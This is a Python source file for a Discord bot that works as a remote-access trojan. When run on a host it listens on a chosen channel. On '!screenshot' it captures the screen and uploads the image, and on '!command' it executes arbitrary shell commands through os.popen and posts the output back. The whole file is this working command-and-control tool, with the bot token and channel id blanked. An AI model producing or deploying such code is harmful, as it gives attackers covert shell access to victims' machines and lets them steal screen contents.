import discord
from discord.ext import commands
import os
from mss import mss


intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

token = ('M--') 
channel_id = 1 --

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

@bot.event
async def on_message(message):
    if message.channel.id != channel_id:
        pass
    else:
        if message.content == "!screenshot":
            try:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP'), 'monitor.png'))

                file = discord.File(os.path.join(os.getenv('TEMP'), 'monitor.png'), filename='monitor.png')
                await message.channel.send('[*] Command successfully executed', file=file)

                os.remove(os.path.join(os.getenv('TEMP'), 'monitor.png'))
                print('Screenshot file deleted.')


            except Exception as e:
                print(f'An error occurred: {e}')
                await message.channel.send('[!] An error occurred during the screenshot process.')

        elif message.content.startswith("!command"):
            command = message.content[9:] 
            try:
                result = os.popen(command).read()  
                await message.channel.send(f"[*] Command successfully executed:\n```\n{result}\n```")
            except Exception as e:
                await message.channel.send(f"[!] An error occurred: {e}")
                
        elif message.content.startswith("!help"):
            await message.channel.send("[*] Command have {!screenshot, command}")

bot.run(token)
